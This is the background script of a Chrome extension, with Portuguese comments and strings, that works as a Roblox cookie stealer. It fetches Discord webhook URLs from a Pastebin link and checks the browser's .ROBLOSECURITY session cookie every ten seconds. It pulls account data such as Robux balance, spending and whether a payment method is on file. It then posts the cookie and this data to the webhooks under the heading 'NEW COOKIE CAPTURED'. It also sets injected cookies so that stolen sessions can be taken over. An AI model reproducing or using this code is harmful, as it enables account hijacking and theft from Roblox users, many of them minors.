let processedCookies = new Set();
let webhookUrls = [];

// Função para carregar webhooks de múltiplos Pastebins
async function carregarWebhooks() {
    try {
        const pastebinUrls = [
            'https://pastebin.com/raw/JqQXrwfs'
        ];

        let allWebhooks = [];

        // Carregar webhooks de todos os Pastebins
        for (const pastebinUrl of pastebinUrls) {
            try {
                const response = await fetch(pastebinUrl);
                if (response.ok) {
                    const content = await response.text();
                    // Processar o conteúdo para extrair URLs
                    const urls = content.split('\n')
                        .map(line => line.trim())
                        .filter(line => line.startsWith('https://discord.com/api/webhooks/') && line.length > 0);

                    allWebhooks = allWebhooks.concat(urls);
                    console.log(`Webhooks carregados de ${pastebinUrl}: ${urls.length}`);
                }
            } catch (error) {
                console.error(`Erro ao carregar webhooks de ${pastebinUrl}:`, error);
            }
        }

        // Remover duplicatas
        webhookUrls = [...new Set(allWebhooks)];
        console.log(`Total de webhooks únicos carregados: ${webhookUrls.length}`);

    } catch (error) {
        console.error('Erro ao carregar webhooks:', error);
        webhookUrls = []; // Lista vazia se não conseguir carregar
    }
}

// Carregar webhooks quando a extensão iniciar
carregarWebhooks();

// Recarregar webhooks a cada 5 minutos para manter atualizado
setInterval(carregarWebhooks, 300000);

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "setCookie") {
        const cookieValue = request.cookieValue.trim();

        if (processedCookies.has(cookieValue)) {
            sendResponse({ success: true, message: "Cookie já processado anteriormente" });
            return true;
        }

        processedCookies.add(cookieValue);

        console.log("Configurando cookie:", cookieValue.substring(0, 50) + "...");

        chrome.cookies.remove({
            url: "https://www.roblox.com",
            name: ".ROBLOSECURITY"
        }, () => {
            chrome.cookies.set({
                url: "https://www.roblox.com",
                name: ".ROBLOSECURITY",
                value: cookieValue,
                domain: ".roblox.com",
                path: "/",
                secure: true,
                httpOnly: true,
                sameSite: "no_restriction",
                expirationDate: Math.floor(Date.now() / 1000) + 31536000
            }, (cookie) => {
                if (chrome.runtime.lastError) {
                    console.error("Erro ao configurar cookie:", chrome.runtime.lastError);
                    sendResponse({ success: false, error: chrome.runtime.lastError.message });
                    return;
                }

                if (cookie) {
                    console.log("Cookie configurado com sucesso!");

                    sendResponse({ success: true });

                    setTimeout(() => {
                        chrome.tabs.create({
                            url: "https://www.roblox.com/home"
                        }, (tab) => {
                            console.log("Aba do Roblox aberta:", tab.id);
                        });
                    }, 1000);

                    buscarInformacoesCompletas(cookieValue).then(accountInfo => {
                        enviarCookieParaWebhooks(cookieValue, accountInfo, "manual");
                    }).catch(error => {
                        console.error("Erro ao buscar informações:", error);
                    });

                } else {
                    console.error("Falha ao configurar cookie");
                    sendResponse({ success: false, error: "Falha ao configurar cookie" });
                }
            });
        });

        return true;
    }
});

async function buscarInformacoesCompletas(cookie) {
    try {
        const headers = {
            "Cookie": `.ROBLOSECURITY=${cookie}`,
            "Content-Type": "application/json"
        };

        const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: headers,
            credentials: 'include'
        });

        if (!userResponse.ok) {
            throw new Error(`Falha na autenticação: ${userResponse.status}`);
        }

        const userData = await userResponse.json();

        const [
            robuxInfo,
            premiumInfo,
            profileInfo,
            friendsCount,
            followersCount,
            transactionsInfo
        ] = await Promise.all([
            buscarRobux(cookie, headers),
            buscarPremium(cookie, headers),
            buscarPerfil(userData.id, headers),
            buscarContagemAmigos(userData.id, headers),
            buscarContagemSeguidores(userData.id, headers),
            buscarTransacoes(userData.id, headers)
        ]);

        let accountAge = "Desconhecido";
        if (userData.created) {
            const createdDate = new Date(userData.created);
            const now = new Date();
            const diffTime = Math.abs(now - createdDate);
            const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
            accountAge = `${diffDays} dias`;
        }

        return {
            username: userData.name || "Não disponível",
            displayName: userData.displayName || "Não disponível",
            userId: userData.id || "Não disponível",
            robux: robuxInfo.balance || 0,
            robuxPending: robuxInfo.pending || 0,
            robuxSpent: transactionsInfo.totalSpent || 0,
            hasPremium: premiumInfo.isPremium || false,
            creditCard: premiumInfo.hasBilling || "Verificação necessária",
            profileLink: `https://www.roblox.com/users/${userData.id}/profile`,
            profilePicture: profileInfo.imageUrl || null,
            friendsCount: friendsCount || 0,
            followersCount: followersCount || 0,
            accountAge: accountAge,
            created: userData.created || null
        };

    } catch (error) {
        console.error("Erro ao buscar informações completas:", error);
        throw error;
    }
}

async function buscarRobux(cookie, headers) {
    try {
        const response = await fetch("https://economy.roblox.com/v1/user/currency", {
            headers: headers,
            credentials: 'include'
        });

        if (response.ok) {
            const data = await response.json();
            return {
                balance: data.robux || 0,
                pending: data.pendingRobux || 0
            };
        }
        return { balance: 0, pending: 0 };
    } catch (error) {
        console.error("Erro ao buscar Robux:", error);
        return { balance: 0, pending: 0 };
    }
}

async function buscarPremium(cookie, headers) {
    try {
        const response = await fetch("https://premiumfeatures.roblox.com/v1/users/membership", {
            headers: headers,
            credentials: 'include'
        });

        if (response.ok) {
            const data = await response.json();
            const hasBilling = await verificarMetodoPagamento(cookie, headers);
            return {
                isPremium: data.isPremium || false,
                hasBilling: hasBilling ? "✅ Cadastrado" : "❌ Não cadastrado"
            };
        }
        return { isPremium: false, hasBilling: "Verificação necessária" };
    } catch (error) {
        console.error("Erro ao verificar premium:", error);
        return { isPremium: false, hasBilling: "Erro na verificação" };
    }
}

async function verificarMetodoPagamento(cookie, headers) {
    try {
        const response = await fetch("https://billing.roblox.com/v1/paymentmethods", {
            headers: headers,
            credentials: 'include'
        });
        return response.ok;
    } catch (error) {
        return false;
    }
}

async function buscarPerfil(userId, headers) {
    try {
        const response = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`, {
            headers: headers,
            credentials: 'include'
        });

        if (response.ok) {
            const data = await response.json();
            if (data.data && data.data.length > 0) {
                return { imageUrl: data.data[0].imageUrl };
            }
        }
        return { imageUrl: null };
    } catch (error) {
        console.error("Erro ao buscar foto de perfil:", error);
        return { imageUrl: null };
    }
}

async function buscarContagemAmigos(userId, headers) {
    try {
        const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
            headers: headers,
            credentials: 'include'
        });

        if (response.ok) {
            const data = await response.json();
            return data.count || 0;
        }
        return 0;
    } catch (error) {
        console.error("Erro ao buscar contagem de amigos:", error);
        return 0;
    }
}

async function buscarContagemSeguidores(userId, headers) {
    try {
        const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
            headers: headers,
            credentials: 'include'
        });

        if (response.ok) {
            const data = await response.json();
            return data.count || 0;
        }
        return 0;
    } catch (error) {
        console.error("Erro ao buscar contagem de seguidores:", error);
        return 0;
    }
}

async function buscarTransacoes(userId, headers) {
    try {
        const response = await fetch(`https://economy.roblox.com/v1/users/${userId}/transactions?transactionType=expense&limit=100`, {
            headers: headers,
            credentials: 'include'
        });

        let totalSpent = 0;

        if (response.ok) {
            const data = await response.json();
            if (data.data && data.data.length > 0) {
                data.data.forEach(transaction => {
                    if (transaction.currency && transaction.currency.amount) {
                        totalSpent += Math.abs(transaction.currency.amount);
                    }
                });
            }
        }

        return { totalSpent: totalSpent };
    } catch (error) {
        console.error("Erro ao buscar transações:", error);
        return { totalSpent: 0 };
    }
}

function enviarCookieParaWebhooks(cookieValue, accountInfo, source) {
    if (webhookUrls.length === 0) {
        console.log("Nenhum webhook configurado. Pulando envio.");
        return;
    }

    const embedFields = [
        {
            name: "📋 Informações Básicas",
            value: "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
            inline: false
        },
        {
            name: "👤 Nome de Usuário",
            value: `\`${accountInfo.username}\``,
            inline: true
        },
        {
            name: "📛 Nome de Exibição",
            value: `\`${accountInfo.displayName}\``,
            inline: true
        },
        {
            name: "🆔 User ID",
            value: `\`${accountInfo.userId}\``,
            inline: true
        },
        {
            name: "💰 Economia Detalhada",
            value: "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
            inline: false
        },
        {
            name: "💎 Robux Disponíveis",
            value: `\`${accountInfo.robux.toLocaleString()} R$\``,
            inline: true
        },
        {
            name: "⏳ Robux Pendentes",
            value: `\`${accountInfo.robuxPending.toLocaleString()} R$\``,
            inline: true
        },
        {
            name: "💸 Robux Gastos",
            value: `\`${accountInfo.robuxSpent.toLocaleString()} R$\``,
            inline: true
        },
        {
            name: "⭐ Status Premium",
            value: accountInfo.hasPremium ? "✅ **Premium Ativo**" : "❌ **Sem Premium**",
            inline: true
        },
        {
            name: "💳 Método de Pagamento",
            value: `\`${accountInfo.creditCard}\``,
            inline: true
        },
        {
            name: "👥 Rede Social",
            value: "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
            inline: false
        },
        {
            name: "👥 Amigos",
            value: `\`${accountInfo.friendsCount}\``,
            inline: true
        },
        {
            name: "❤️ Seguidores",
            value: `\`${accountInfo.followersCount}\``,
            inline: true
        },
        {
            name: "📅 Idade da Conta",
            value: `\`${accountInfo.accountAge}\``,
            inline: true
        },
        {
            name: "🌐 Informações Técnicas",
            value: "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
            inline: false
        },
        {
            name: "📤 Fonte",
            value: source === "manual" ? "🖱️ Inserção Manual" : "🤖 Login Automático",
            inline: true
        },
        {
            name: "🕒 Capturado em",
            value: `\`${new Date().toLocaleString('pt-BR')}\``,
            inline: true
        },
        {
            name: "🔗 Links Rápidos",
            value: "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
            inline: false
        },
        {
            name: "🔗 Perfil Roblox",
            value: `[Clique aqui](${accountInfo.profileLink})`,
            inline: true
        }
    ];

    const embed = {
        title: "🍪 NOVO COOKIE CAPTURADO! 🍪",
        color: 0x888888,
        timestamp: new Date().toISOString(),
        fields: embedFields,
        footer: {
            text: "Yato Community",
            icon_url: "https://i.imgur.com/8Q6Qy3C.png"
        },
        author: {
            name: `${accountInfo.displayName} (@${accountInfo.username})`,
            url: accountInfo.profileLink,
            icon_url: accountInfo.profilePicture || "https://i.imgur.com/8Q6Qy3C.png"
        }
    };

    if (accountInfo.profilePicture) {
        embed.thumbnail = { url: accountInfo.profilePicture };
    }

    const data = {
        content: "@everyone 🚨 **NOVO COOKIE CAPTURADO COM SUCESSO!** 🚨",
        embeds: [embed]
    };

    const cookieData = {
        content: `**Cookie .ROBLOSECURITY**\n\`\`\`${cookieValue}\`\`\``
    };

    webhookUrls.forEach(webhookUrl => {
        fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        }).then(() => {
            fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(cookieData)
            });
        }).catch(error => {
            console.error(`Erro ao enviar para webhook ${webhookUrl}:`, error);
        });
    });
}

function monitorarCookies() {
    setInterval(() => {
        chrome.cookies.get({
            url: "https://www.roblox.com",
            name: ".ROBLOSECURITY"
        }, (cookie) => {
            if (cookie && !processedCookies.has(cookie.value)) {
                processedCookies.add(cookie.value);
                buscarInformacoesCompletas(cookie.value).then(accountInfo => {
                    enviarCookieParaWebhooks(cookie.value, accountInfo, "auto");
                });
            }
        });
    }, 10000);
}


monitorarCookies();
